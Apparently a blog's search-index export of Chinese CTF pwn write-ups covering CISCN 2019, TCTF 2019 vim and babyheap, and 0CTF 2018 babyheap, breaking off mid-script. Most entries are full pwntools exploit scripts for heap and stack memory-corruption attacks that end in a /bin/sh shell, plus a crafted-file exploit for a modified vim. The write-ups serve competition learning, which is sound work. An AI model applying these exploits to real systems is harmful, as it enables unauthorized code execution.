<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[2019全国大学生信息安全竞赛(CISCN)初赛解题赛Pwn WriteUp]]></title>
    <url>%2F2019%2F04%2F22%2Fciscn-2019-preliminaries%2F</url>
    <content type="text"><![CDATA[Pwn相对来说还是比较简单的，和舍友一起AK了。 your_pwn数组越界，可对栈进行任意修改，将函数的返回地址改至one_gadget即可。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192# coding=utf-8from pwn import *def do_one(p, idx): p.sendlineafter('input index\n', str(idx)) p.recvuntil('now value(hex) ') recv = '0x' + p.recvuntil('\n', drop=True) #if recv != '0x0': # print idx #print recv p.sendlineafter('input new value\n', str(int(recv, 16))) return int(recv, 16)def write_one(p, idx, num): p.sendlineafter('input index\n', str(idx)) p.recvuntil('now value(hex) ') recv = '0x' + p.recvuntil('\n', drop=True) p.sendlineafter('input new value\n', str(num)) return int(recv, 16) def pwn(): BIN_PATH = './pwn' DEBUG = 0 context.arch = 'amd64' #context.arch = 'i386' if DEBUG == 1: p = process(BIN_PATH) elf = ELF(BIN_PATH) #context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('', ) elf = ELF(BIN_PATH) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') #context.log_level = 'debug' if DEBUG == 1: gdb.attach(p) raw_input() p.sendlineafter('name:', 'sunichi') libc_addr = [] for i in range(6): libc_addr.append(do_one(p, 0x7ffc0ffeae68 + i - (0x7ffc0ffead40 - 0x150))) start_addr = 0 for i in range(6): print hex(libc_addr[i]) start_addr += (libc_addr[i] &amp; 0xff) &lt;&lt; (i * 8) libc.address = start_addr - (0x7fad3b311830 - 0x00007fad3b2f1000) for i in range(41-6-6): do_one(p, 0) print hex(libc.address + 0xf1147) for i in range(6): print hex(((libc.address + 0xf1147) &gt;&gt; (i * 8)) &amp; 0xff) write_one(p, 0x7ffeb2b1b148 + i - (0x7ffeb2b1b140 - 0x150), ((libc.address + 0xf1147) &gt;&gt; (i * 8)) &amp; 0xff) print hex(libc.address) p.interactive() p.close()if __name__ == '__main__': pwn()'''0x45216 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL''' daily申请chunk的时候没有清空，导致地址泄漏。free的时候没有对数组越界进行检查，在获得堆地址后，可以计算偏移直接越界并进行fastbin attack（在堆中特定位置写入要double free的chunk的地址）。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113# coding=utf-8from pwn import *def add(p, size, content): p.sendlineafter('Your choice:', str(2)) p.sendafter('length of daily:', str(size)) p.sendafter('you daily\n', content)def show(p): p.sendlineafter('Your choice:', str(1))def delete(p, idx): p.sendlineafter('Your choice:', str(4)) p.sendlineafter('Please enter the index of daily:', str(idx))def change(p, idx, content): p.sendlineafter('Your choice:', str(3)) p.sendlineafter('Please enter the index of daily:', str(idx)) p.sendafter('Please enter the new daily\n', content) def pwn(): BIN_PATH = './pwn' DEBUG = 0 context.arch = 'amd64' #context.arch = 'i386' if DEBUG == 1: p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('', ) elf = ELF(BIN_PATH) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') #context.log_level = 'debug' add(p, 0x100, 'sunichi') #0 add(p, 0x68, 'sunichi') #1 add(p, 0x68, 'sunichi') #2 add(p, 0x68, 'sunichi') #3 delete(p, 0) add(p, 0x100, 's') show(p) p.recvuntil('0 : ') recv = p.recv(6) + '\x00\x00' if DEBUG == 1: libc.address = u64(recv) - (0x00007f2a09751b73 - 0x00007f2a0938d000) else: libc.address = u64(recv) - (0x00007f2a09751b73 - 0x00007f2a0938d000) delete(p, 1) delete(p, 2) add(p, 0x68, 's') #1 show(p) p.recvuntil('1 : ') recv = p.recvuntil('3 : ', drop=True) recv = recv.ljust(8, '\x00') heap_base = u64(recv) - (0x0000000001bba173 - 0x1bba000) change(p, 1, 'a' * 8 * 3 + p64(heap_base + 0x120)) delete(p, 1) #gdb.attach(p, gdbscript='b *0x400c39') #raw_input() delete(p, (heap_base + 0x1a0 - 0x602060) / 0x10) add(p, 0x68, p64(libc.symbols['__malloc_hook'] - 0x13)) add(p, 0x68, '\n') add(p, 0x68, '\n') add(p, 0x68, '\x00\x00\x00' + p64(libc.address + 0xf02a4)) delete(p, 1) delete(p, 4) print hex(libc.address) print hex(heap_base) #gdb.attach(p) p.interactive() p.close()if __name__ == '__main__': pwn()'''0x45216 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL''' baby_pwn32位典型的ret2dl-resolve的题目，改改以前脚本的参数就行了。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102# coding=utf-8from pwn import *def pwn(): BIN_PATH = './pwn' DEBUG = 0 #context.arch = 'amd64' context.arch = 'i386' if DEBUG == 1: p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('', ) elf = ELF(BIN_PATH) libc = ELF('/lib/i386-linux-gnu/libc.so.6') context.log_level = 'debug' if DEBUG == 1: gdb.attach(p) raw_input() offset = 44 ppp_ret = 0x080485d9 pop_ebp_ret = 0x080485db leave_ret = 0x08048448 stack_size = 0x800 bss_addr = 0x0804a040 base_stage = bss_addr + stack_size read_plt = elf.plt['read'] payload = 'A' * offset payload += p32(read_plt) payload += p32(ppp_ret) payload += p32(0) payload += p32(base_stage) payload += p32(100) payload += p32(pop_ebp_ret) payload += p32(base_stage) payload += p32(leave_ret) p.sendline(payload) cmd = "/bin/sh" plt_0 = 0x08048380 # objdump -d -j .plt bof rel_plt = 0x804833c # objdump -s -j .rel.plt bof index_offset = (base_stage + 28) - rel_plt alarm_got = elf.got['alarm'] dynsym = 0x080481DC dynstr = 0x0804827C fake_sym_addr = base_stage + 36 align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf) fake_sym_addr = fake_sym_addr + align index_dynsym = (fake_sym_addr - dynsym) / 0x10 r_info = (index_dynsym &lt;&lt; 8) | 0x7 fake_reloc = p32(alarm_got) + p32(r_info) st_name = (fake_sym_addr + 16) - dynstr fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12) payload2 = 'AAAA' payload2 += p32(plt_0) payload2 += p32(index_offset) payload2 += 'AAAA' payload2 += p32(base_stage + 80) payload2 += 'aaaa' payload2 += 'aaaa' payload2 += fake_reloc # (base_stage+28)的位置 payload2 += 'B' * align payload2 += fake_sym # (base_stage+36)的位置 payload2 += "system\x00" payload2 += 'A' * (80 - len(payload2)) payload2 += cmd + '\x00' payload2 += 'A' * (100 - len(payload2)) p.send(payload2) p.interactive() p.close()if __name__ == '__main__': pwn()'''0x080485db : pop ebp ; ret0x080485d8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret0x0804837d : pop ebx ; ret0x080485da : pop edi ; pop ebp ; ret0x080485d9 : pop esi ; pop edi ; pop ebp ; ret0x080481ab : ret0x0804845e : ret 0xeac1''' Double对于连续的相同的内容，程序不会重新申请新的chunk而是共用，但free的时候并没有检查是否还有info在使用，导致uaf。通过fastbin attack即可信息泄露和getshell。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103# coding=utf-8from pwn import *def add(p, content): p.sendlineafter('&gt; ', str(1)) p.sendafter('Your data:\n', content)def show(p, idx): p.sendlineafter('&gt; ', str(2)) p.sendlineafter('Info index: ', str(idx))def change(p, idx, content): p.sendlineafter('&gt; ', str(3)) p.sendlineafter('Info index: ', str(idx)) p.send(content)def delete(p, idx): p.sendlineafter('&gt; ', str(4)) p.sendlineafter('Info index: ', str(idx))def pwn(): BIN_PATH = './pwn' DEBUG = 0 context.arch = 'amd64' if DEBUG == 1: p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('', ) elf = ELF(BIN_PATH) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') #context.log_level = 'debug' add(p, 'a' * (0xff) + '\n') #0 add(p, 'a' * (0xff) + '\n') #1 delete(p, 0) show(p, 1) recv = p.recv(6) + '\x00\x00' libc.address = u64(recv) - (0x7fece5e8eb78 - 0x00007fece5aca000) add(p, 'a' * (0x67) + '\n') #2 add(p, 'a' * (0x67) + '\n') #3 add(p, 'a' * (0x1f) + '\n') #4 add(p, 'b' * (0x67) + '\n') #5 delete(p, 2) delete(p, 5) delete(p, 3) payload = p64(libc.symbols['__malloc_hook'] - 0x13) payload = payload.ljust(0x67, 'a') + '\n' add(p, payload) add(p, 'c' * (0x67) + '\n') add(p, 'd' * (0x67) + '\n') add(p, 'e' * (0x47) + '\n') add(p, 'e' * (0x47) + '\n') payload = 'a'*3 + p64(libc.address + 0xf1147) payload = payload.ljust(0x67, 'a') + '\n' add(p, payload) print hex(libc.address) delete(p, 8) delete(p, 9) #gdb.attach(p) p.interactive() p.close()if __name__ == '__main__': pwn()'''0x45216 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL''' bmstcache，UAF，修改stdout来泄漏地址，劫持free@got。舍友做的，就不贴脚本了。 Virtual在save和load的时候没有检查操作数是否导致地址越界，从而能够前后向任意偏移save和load。通过save将用户输入stack data的数据结构的指针指到free@got后，先打远程，通过泄漏的地址可以获取libc的版本。然后用同样思路，只不过多一步操作（push add pop）将free@got的内容修改为one_gadget。输入的时候多输入一个数据使得free@got处的数据能够被push。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556# coding=utf-8from pwn import *def pwn(): BIN_PATH = './pwn' DEBUG = 0 context.arch = 'amd64' if DEBUG == 1: p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('', ) elf = ELF(BIN_PATH) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') #context.log_level = 'debug' #gdb.attach(p, gdbscript='b *0x401B42') p.sendlineafter('Your program name:\n', 'sunichi') payload = 'push push push save push add pop' p.sendlineafter('Your instruction:\n', payload) print hex(libc.symbols['free']) payload = str(0xf1147 - libc.symbols['free']) + ' ' + str(elf.got['free']) + ' ' + str((0xffffffffffffffff - 1663) / 8) + ' ' + '1 ' p.sendlineafter('Your stack data:\n', payload) p.interactive() p.close()if __name__ == '__main__': pwn()'''0x45216 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL''']]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2019</tag>
        <tag>ciscn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TCTF 2019 vim]]></title>
    <url>%2F2019%2F04%2F04%2FTCTF-2019-vim%2F</url>
    <content type="text"><![CDATA[自定义的加解密方法存在漏洞。 0x00 源代码刨析key设置为恒为字符串a。 1234// to avoid interactive step, without loss of generalityp1 = alloc(8);p1[0] = 'a';p1[1] = NUL; cryptstate_T结构体： 12345678910/* The state of encryption, referenced by cryptstate_T. */typedef struct &#123; int key; int shift; int step; int orig_size; int size; int cur_idx; char_u *buffer;&#125; perm_state_T; init函数，其中主要做的是计算cryptstate_T结构体的key，可以在此函数下断点验证传入的key是否为”a”。 1234567891011121314151617181920crypt_perm_init( cryptstate_T *state, char_u *key, char_u *salt UNUSED, int salt_len UNUSED, char_u *seed UNUSED, int seed_len UNUSED)&#123; char_u *p; perm_state_T *ps; ps = (perm_state_T *)alloc(sizeof(perm_state_T)); ps-&gt;key = 0; state-&gt;method_state = ps; for (p = key; *p != NUL; ++p) &#123; ps-&gt;key = 131*ps-&gt;key + *p; &#125;&#125; 解密函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758crypt_perm_decode( cryptstate_T *state, char_u *from, size_t len, char_u *to)&#123; perm_state_T *ps = state-&gt;method_state; size_t i; if (len&lt;=4) &#123; for (i = 0; i &lt; len; ++i) to[i] = from[i]; return; &#125; unsigned int iv; for (i = 0; i &lt; 4; ++i) &#123; to[i] = from[i]; iv = (iv&lt;&lt;8) + from[i]; &#125; ps-&gt;orig_size = len-4; ps-&gt;size = ps-&gt;orig_size; while (!is_prime(ps-&gt;size)) ps-&gt;size++; ps-&gt;shift = ps-&gt;key % (len-4); if (ps-&gt;shift &gt; 0) ps-&gt;buffer = alloc(ps-&gt;shift); ps-&gt;step = ps-&gt;key ^ iv; if (ps-&gt;step % ps-&gt;size == 0) ps-&gt;step++; ps-&gt;cur_idx = 0; /* Step 1: Inverse of Multiplication */ i = 4; while (i &lt; len) &#123; if (ps-&gt;cur_idx &lt; ps-&gt;orig_size) &#123; to[ps-&gt;cur_idx+4] = from[i]; i++; &#125; ps-&gt;cur_idx = (ps-&gt;cur_idx+ps-&gt;step)%ps-&gt;size; &#125; /* Step 2: Inverse of Addition */ for (i = 0; i &lt; ps-&gt;shift; ++i) ps-&gt;buffer[i] = to[i+4]; for (i = 4+ps-&gt;shift; i &lt; len; ++i) to[i-ps-&gt;shift] = to[i]; for (i = 0; i &lt; ps-&gt;shift; ++i) to[len-ps-&gt;shift+i] = ps-&gt;buffer[i]; if (ps-&gt;shift &gt; 0) vim_free(ps-&gt;buffer);&#125; 需要知道IV在头文件中的位置，漏洞主要在步骤1中： 12345678910111213141516171819202122232425262728293031/* The state of encryption, referenced by cryptstate_T. */typedef struct &#123; int key; int shift; int step; int orig_size; int size; int cur_idx; char_u *buffer;&#125; perm_state_T;crypt_perm_decode( cryptstate_T *state, char_u *from, size_t len, char_u *to)&#123; // ... /* Step 1: Inverse of Multiplication */ i = 4; while (i &lt; len) &#123; if (ps-&gt;cur_idx &lt; ps-&gt;orig_size) &#123; to[ps-&gt;cur_idx+4] = from[i]; i++; &#125; ps-&gt;cur_idx = (ps-&gt;cur_idx+ps-&gt;step)%ps-&gt;size; &#125; // ...&#125; 这里没有检查ps-&gt;cur_idx的值，导致可以控制其为负数，造成堆的前向溢出。 from是vim打开的文件。ps-&gt;step可以通过 1234567891011unsigned int iv;for (i = 0; i &lt; 4; ++i)&#123; to[i] = from[i]; iv = (iv&lt;&lt;8) + from[i];&#125;// ...ps-&gt;step = ps-&gt;key ^ iv;if (ps-&gt;step % ps-&gt;size == 0) ps-&gt;step++;ps-&gt;cur_idx = 0; 控制。 如果能改写ps-&gt;buffer的值，就能进一步利用 123/* Step 2: Inverse of Addition */for (i = 0; i &lt; ps-&gt;shift; ++i) ps-&gt;buffer[i] = to[i+4]; 达到任意地址写的目的。 0x01 Debug it生成脚本： 12345678910111213141516def main(): payload = 'VimCrypt~04!' payload += 'aaaa' payload += 'bbbb' payload += 'cccc' payload += 'dddd' payload += 'eeee' payload += 'ffff' payload += 'gggg' payload += 'hhhh' with open('exp', 'wb') as f: f.write(payload)if __name__ == '__main__': main() 设置参数和断点： crypt_perm_init()断点： 12345678910111213141516crypt_perm_init( cryptstate_T *state, char_u *key, char_u *salt UNUSED, int salt_len UNUSED, char_u *seed UNUSED, int seed_len UNUSED)&#123; // ... ps-&gt;key = 0; // ... for (p = key; *p != NUL; ++p) &#123; ps-&gt;key = 131*ps-&gt;key + *p; &#125;&#125; 可以发现RSI指向的key为字符串”aNUL”，因此ps-&gt;key的值为0x61。 12345crypt_perm_decode( cryptstate_T *state, char_u *from, size_t len, char_u *to) 通过调试可以发现from（图中的rsi指向的数据）即为去除maigc的剩余部分输入内容，也就是说IV即输入文件除去魔术数的前四字节。 123456unsigned int iv;for (i = 0; i &lt; 4; ++i)&#123; to[i] = from[i]; iv = (iv&lt;&lt;8) + from[i];&#125; 为了让ps-&gt;step为-1，ps-&gt;key就要为-1^iv。 1ps-&gt;step = ps-&gt;key ^ iv; 由上图可以知道rax的值为0x900000即ps变量，rcx的值为0x900030即to参数。它们紧挨在一起，使得to的向前溢出能够覆盖ps变量，从而达到改写ps-&gt;buffer的目的。 1234567891011121314151617181920212223242526272829303132333435/* The state of encryption, referenced by cryptstate_T. */typedef struct &#123; int key; int shift; int step; int orig_size; int size; int cur_idx; char_u *buffer;&#125; perm_state_T;crypt_perm_decode( cryptstate_T *state, char_u *from, size_t len, char_u *to)&#123; // ... /* Step 1: Inverse of Multiplication */ i = 4; while (i &lt; len) &#123; if (ps-&gt;cur_idx &lt; ps-&gt;orig_size) &#123; to[ps-&gt;cur_idx+4] = from[i]; i++; &#125; ps-&gt;cur_idx = (ps-&gt;cur_idx+ps-&gt;step)%ps-&gt;size; &#125; // ... /* Step 2: Inverse of Addition */ for (i = 0; i &lt; ps-&gt;shift; ++i) ps-&gt;buffer[i] = to[i+4]; // ...&#125; 但是代码从to[i+4]处开始获得数据写入ps-&gt;buffer，因此需要想办法向to[i+4]之后的地址写入数据。 观察到，ps-&gt;cur_idx是可以被覆盖最高字节的，且在计算的时候会模上from的长度，所以覆盖高字节后，ps-&gt;cur_idx是一个很大的正数，通过求模可将写入to的位置移动到正向方向来进行回写。 0x02 Pwn it在程序中，有一处执行shell的地方： 可以执行rax/rcx的所指向的命令。 crypt_perm_decode()在最后执行了vim_free(ps-&gt;buffer)，而在vim_free()中，call free的时候，rax正是保存了ps-&gt;buffer的地址，因此在修改free@got的同时通过向ps-&gt;buffer写入cat flag即可获取flag。 exp生成脚本如下： 1234567891011121314151617181920212223from pwn import *import structdef main(): elf = ELF('./vim') payload = 'VimCrypt~04!' payload += struct.pack("&gt;i", -1 ^ 0x61) # iv payload += 'aaaaa' payload += p64(0x61)[::-1] payload += 'cccccccc' payload += p64(elf.got['free'] - 4 - 8)[::-1] payload += 'bbbbbbbb' payload += 'cccccc\x00\x00' payload += '\x00\x00\x00\x4c\x91\x63\x00\x00' payload += '\x00\x00galf t' payload += 'ac'.ljust(8, '\x00') with open('exp', 'wb') as f: f.write(payload)if __name__ == '__main__': main()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2019</tag>
        <tag>tctf</tag>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TCTF 2019 babyheap]]></title>
    <url>%2F2019%2F03%2F27%2FTCTF-2019-babyheap%2F</url>
    <content type="text"><![CDATA[程序中的唯一漏洞就是在写入数据时发生了off-by-null。 程序中使用calloc函数作为分配堆块的函数，需要注意该函数不使用tcache，直接调用_int_malloc。 1234567891011121314void *__libc_calloc (size_t n, size_t elem_size)&#123; mstate av; mchunkptr oldtop, p; INTERNAL_SIZE_T bytes, sz, csz, oldtopsize; void *mem; unsigned long clearsize; unsigned long nclears; INTERNAL_SIZE_T *d; // ... mem = _int_malloc (av, sz); // ...&#125; 一开始注意到程序分配了很大一块无用的堆块： 123if ( mmap(addr, 0x1000uLL, 3, 34, -1, 0LL) != addr ) exit(-1);malloc(0x1F000uLL); 这使得top chunk变得非常小了。因此就想到了通过耗尽top chunk来拿到unsorted bin的做法。 第一步先将需要用到的对应大小的fastbin对应的tcache填满，以获得fastbin，并且在分配的过程中不断向top chunk的size溢出\x00以更快的消耗其剩余大小。 在其中适当的位置释放空间连续的fastbin，当top chunk的剩余大小不足以满足分配申请时，将会调用malloc_consolidate函数对fastbin中的空闲chunk进行合并，并放入small bin中，由于申请了空间，small bin被分割后放入unsorted bin。利用常规的off by null和堆块重叠来泄漏地址并供后续fastbin attack。 在进行fastbin attack时，将fd指针指到main_arena中，先把top chunk指到堆的起始位置，即tcache entry处，获取该处内存以用来不断清空tcache计数。随后将top chunk指到stdout附近，通过不断申请、释放、清空tcache计数（避免chunk被放入fastbin而无法使用top chunk）的方法消耗top chunk使其移动到__free_hook附近，并将其改写成one_gadget，通过触发free来getshell。 exp如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190from pwn import *def add(p, size): p.sendlineafter('Command: ', str(1)) p.sendlineafter('Size: ', str(size)) def update(p, idx, size, content): p.sendlineafter('Command: ', str(2)) p.sendlineafter('Index: ', str(idx)) p.sendlineafter('Size: ', str(size)) p.sendafter('Content: ', content)def delete(p, idx): p.sendlineafter('Command: ', str(3)) p.sendlineafter('Index: ', str(idx))def view(p, idx): p.sendlineafter('Command: ', str(4)) p.sendlineafter('Index: ', str(idx))def pwn(): #p = process('./babyheap') p = remote('111.186.63.20', 10001) elf = ELF('./babyheap') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') #context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] for i in range(7): add(p, 0x28) update(p, i, 0x28, 'a' * 0x28) for i in range(7): delete(p, i) for i in range(7): add(p, 0x38) update(p, i, 0x38, 'a' * 0x38) for i in range(7): delete(p, i) for i in range(8): add(p, 0x48) update(p, i, 0x48, 'a' * 0x48) for i in range(7): delete(p, i) # 7 for i in range(4): # 0 ~ 3 add(p, 0x38) update(p, i, 0x38, 'a' * 0x38) add(p, 0x38) # 4 payload = p64(0) * 4 + p64(0x100) + p64(0x60) + p64(0) update(p, 4, 0x38, payload) add(p, 0x48) # 5 update(p, 5, 0x48, 'a' * 0x48) add(p, 0x38) # 6 update(p, 6, 0x38, 'a' * 0x38) for i in range(5): # 0 ~ 4 delete(p, i) add(p, 0x58) # 0 add(p, 0x58) # 1 add(p, 0x28) # 2 update(p, 2, 0x28, 'a' * 0x28) delete(p, 5) add(p, 0x38) # 3 add(p, 0x38) # 4 add(p, 0x38) # 5 add(p, 0x38) # 8 delete(p, 3) delete(p, 4) add(p, 0x28) # 3 add(p, 0x48) # 4 view(p, 5) p.recvuntil('[5]: ') recv = p.recv(6) + '\x00\x00' libc.address = u64(recv) - (0x7f8b3cdeaca0 - 0x00007f8b3cc06000) add(p, 0x48) # 9 target_address = libc.address + (0x7fd5d1e8bc55 - 0x7fd5d1ca7000) # 5 - 9 is same delete(p, 4) #4 delete(p, 9) #9 delete(p, 2) #2 view(p, 5) p.recvuntil('[5]: ') recv = p.recv(6) + '\x00\x00' heap_address = u64(recv) print hex(target_address) update(p, 5, 0x8, p64(target_address)) add(p, 0x48) # 2 - 5 is same add(p, 0x48) # 4 tcache_entry = heap_address - (0x563db82df850 - 0x563db82c0000) payload = '\x00\x00\x00' + p64(0) * 7 + p64(tcache_entry) update(p, 4, len(payload), payload) add(p, 0x58) # 9 add(p, 0x28) # 10 add(p, 0x28) # 11 add(p, 0x28) # 12 update(p, 12, 0x28, '\x00' * 0x28) delete(p, 10) delete(p, 11) delete(p, 9) payload = '\x00\x00\x00' + p64(0) * 7 + p64(libc.address + 0x7ffff7fc3850 - 0x00007ffff7dde000) update(p, 4, len(payload), payload) count = [9, 10, 11, 13, 14, 15] for i in range(6): add(p, 0x58) # 9 for i in range(6): delete(p, count[i]) update(p, 12, 0x28, '\x00' * 0x28) for j in range(6): for i in range(6): add(p, 0x58) # 9 for i in range(6): delete(p, count[i]) update(p, 12, 0x28, '\x00' * 0x28) add(p, 0x58) # 9 update(p, 9, 8, 'sunichi') add(p, 0x58) # 10 add(p, 0x58) # 11 payload = p64(0) + p64(libc.address + 0x103f50) update(p, 11, len(payload), payload) print hex(heap_address) print hex(libc.address) print hex(target_address) #get shell delete(p, 9) #gdb.attach(p) p.interactive() p.close()if __name__ == '__main__': pwn()'''0x50186 execve("/bin/sh", rsp+0x40, environ)constraints: rcx == NULL0x501e3 execve("/bin/sh", rsp+0x40, environ)constraints: [rsp+0x40] == NULL0x501ef execve("/bin/sh", rsi, [rax])constraints: [rsi] == NULL || rsi == NULL [[rax]] == NULL || [rax] == NULL0xdf39f execve("/bin/sh", rcx, [rbp-0x70])constraints: [rcx] == NULL || rcx == NULL [[rbp-0x70]] == NULL || [rbp-0x70] == NULL0xdf3a3 execve("/bin/sh", rcx, rdx)constraints: [rcx] == NULL || rcx == NULL [rdx] == NULL || rdx == NULL0xdf3a6 execve("/bin/sh", rsi, rdx)constraints: [rsi] == NULL || rsi == NULL [rdx] == NULL || rdx == NULL0x103f50 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL''']]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
        <tag>2019</tag>
        <tag>tctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Learn Address Sanitizer with TCTF 2019 babyaegis]]></title>
    <url>%2F2019%2F03%2F27%2FLearn-Address-Sanitizer-with-TCTF-2019-babyaegis%2F</url>
    <content type="text"><![CDATA[比较有趣又能学到新知识的一题。 【施工中】]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
        <tag>2019</tag>
        <tag>tctf</tag>
        <tag>asan</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019 Mar pwn writeup]]></title>
    <url>%2F2019%2F03%2F12%2F19-Mar%2F</url>
    <content type="text"><![CDATA[0CTF Quals 2018 babyheap [2019.03.12]一道挺有趣的fast bin做法的题。 漏洞为off-by-one。一开始想利用FSOP来getshell，但是由于程序申请的chunk的大小的限制，无法将chunk从unsorted bin放入smallbin[4]。 由于程序允许的chunk大小范围时0x20-0x50，因此可以利用堆地址的0x55/0x56来获取main_arena处的空间，进而修改top_chunk指针到malloc_hook附近劫持malloc_hook。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697# coding=utf-8from pwn import *def add(p, size): p.sendlineafter('Command: ', str(1)) p.sendlineafter('Size: ', str(size))def update(p, idx, content, attack=0, size=0): p.sendlineafter('Command: ', str(2)) p.sendlineafter('Index: ', str(idx)) if attack == 0: p.sendlineafter('Size: ', str(len(content))) else: p.sendlineafter('Size: ', str(size)) p.sendafter('Content: ', content)def delete(p, idx): p.sendlineafter('Command: ', str(3)) p.sendlineafter('Index: ', str(idx))def view(p, idx): p.sendlineafter('Command: ', str(4)) p.sendlineafter('Index: ', str(idx))def pwn(): BIN_PATH = './program' DEBUG = 1 local = 1 context.arch = 'amd64' if DEBUG == 1: p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': if local == 1: libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('./libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') add(p, 0x28) #0 add(p, 0x58) #1 add(p, 0x48) #2 update(p, 0, '\x00' * 0x28 + '\x91', 1, 0x29) update(p, 2, p64(0) * 5 + p64(0x21)) delete(p, 1) add(p, 0x58) #1 view(p, 2) p.recvuntil('k[2]: ') recv = p.recv(8) libc.address = u64(recv) - (0x7f4675a13b78 - 0x00007f467564f000) log.info('libc:%s' % hex(libc.address)) update(p, 2, recv * 2 + p64(0) * 2 + p64(0x30) + p64(0x21)) update(p, 0, '\x00' * 0x28 + '\x91', 1, 0x29) delete(p, 1) view(p, 2) p.recvuntil('k[2]: ') p.recv(8) heap = p.recv(8) heap_addr = u64(heap) - 0x60 log.info('heap base:%s' % hex(heap_addr)) # clear the heap add(p, 0x28) #1 update(p, 2, p64(0) * 4 + p64(0x90) + p64(0x20)) add(p, 0x58) #3 add(p, 0x28) #4 update(p, 3, '\x00' * 0x58 + '\x51', 1, 0x59) # chunk overlap to fast bin attack delete(p, 2) delete(p, 0) update(p, 4, p64(libc.address + (0x7f7aaf721b2d - 0x00007f7aaf35d000))) add(p, 0x48) #0 add(p, 0x48) #2 main_arena payload = '\x00\x00\x00' + p64(0) * 7 + p64(libc.symbols['__malloc_hook'] - 0x23) update(p, 2, payload) add(p, 0x38) payload = '\x00\x00\x00' + p64(0) + p64(0) + p64(libc.address + 0xf02a4) update(p, 5, payload) # getshell delete(p, 1) delete(p, 4)# gdb.attach(p) p.interactive() p.close()if __name__ 